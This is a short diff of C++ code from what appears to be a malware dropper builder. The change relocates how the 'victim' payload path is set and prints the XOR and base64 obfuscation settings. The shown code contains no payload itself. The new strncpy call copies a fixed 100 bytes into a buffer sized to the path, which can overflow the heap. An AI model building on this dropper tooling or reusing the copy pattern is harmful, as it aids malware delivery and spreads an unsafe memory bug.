@@ -60,16 +60,19 @@ void set_name();
 
 // global: final binary name
 char name[10 * NAME_SIZE];
-
-// (char*) C:\\example\\path\\to\\your\\payload.exe
-std::string absolute_victim_name = std::filesystem::absolute(DROPPER_OUTPUT).string();
-
-char* victim_name = new char[absolute_victim_name.size() + 1];
+char* victim_name;
 
 // Entry Point
 int main(int argc, char* argv[])
 {
-	strncpy(victim_name, absolute_victim_name.c_str(), sizeof(victim_name));
+	// (char*) C:\\example\\path\\to\\your\\payload.exe
+	std::string absolute_victim_name = std::filesystem::absolute(DROPPER_OUTPUT).string();
+
+	victim_name = new char[absolute_victim_name.size() + 1];
+
+	strncpy(victim_name, absolute_victim_name.c_str(), 100);
+
+	victim_name[99] = '\0';
 
 	printf("The absolute file path of the victim name is: %s and the macro is: %s. The xor key is: %d. The base64 is: %d\n", victim_name, DROPPER_OUTPUT, DROPPER_XOR_KEY, DROPPER_BASE64);
 
